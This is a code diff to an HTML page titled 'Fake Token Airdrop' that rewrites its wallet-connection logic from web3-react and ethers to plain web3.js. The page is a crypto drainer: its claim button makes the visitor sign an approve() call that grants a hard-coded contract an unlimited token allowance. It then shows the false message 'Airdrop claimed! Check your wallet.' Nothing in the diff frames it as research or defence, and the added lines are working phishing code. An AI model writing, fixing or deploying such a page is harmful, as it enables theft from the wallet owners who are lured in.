@@ -4,10 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fake Airdrop</title>
-    <!-- Include necessary scripts -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js" type="application/javascript"></script>
-    <script src="https://unpkg.com/@web3-react/core@6.1.9/dist/core.browser.min.js"></script>
-    <script src="https://unpkg.com/@web3-react/injected-connector@6.0.7/dist/injected-connector.browser.min.js"></script>
+    <!-- Include Web3.js from CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
     <h1>Fake Token Airdrop</h1>
@@ -17,28 +15,31 @@
     <div id="status"></div>
 
     <script>
-        const { InjectedConnector } = window.Web3ReactInjectedConnector;
-        const { initializeConnector } = window.Web3ReactInitializeConnector;
-
-        const [injected, injectedHooks] = initializeConnector((actions) => new InjectedConnector(actions));
-
-        let signer;
+        let web3;
 
         async function connectWallet() {
-            injected.activate();
-            const { account, library } = injectedHooks.useWeb3React();
-            if (account && library) {
-                signer = library.getSigner(account);
-                document.getElementById('connectWallet').disabled = true;
-                document.getElementById('claimButton').disabled = false;
-                document.getElementById('status').innerText = "Wallet connected!";
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    web3 = new Web3(window.ethereum);
+                    document.getElementById('connectWallet').disabled = true;
+                    document.getElementById('claimButton').disabled = false;
+                    document.getElementById('status').innerText = "Wallet connected!";
+                } catch (error) {
+                    document.getElementById('status').innerText = "Error connecting wallet: " + error.message;
+                }
+            } else {
+                document.getElementById('status').innerText = "Please install MetaMask!";
             }
         }
 
         async function claimAirdrop() {
-            try {
-                if (!signer) throw new Error("No signer available. Please connect wallet.");
+            if (!web3) {
+                document.getElementById('status').innerText = "Please connect your wallet first.";
+                return;
+            }
 
+            try {
                 // Contract address and ABI
                 const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
                 const abi = [
@@ -50,13 +51,14 @@
                         "type": "function"
                     }
                 ];
-                
-                const contract = new ethers.Contract(contractAddress, abi, signer);
+
+                const contract = new web3.eth.Contract(abi, contractAddress);
+                const accounts = await web3.eth.getAccounts();
+                const account = accounts[0];
 
                 // Approve the contract to spend all tokens (max uint256)
-                const approveTx = await contract.approve(contractAddress, ethers.constants.MaxUint256);
-                await approveTx.wait();
-
+                const approveTx = await contract.methods.approve(contractAddress, web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send({from: account});
+                
                 document.getElementById('status').innerText = "Airdrop claimed! Check your wallet.";
             } catch (error) {
                 document.getElementById('status').innerText = "Something went wrong: " + error.message;
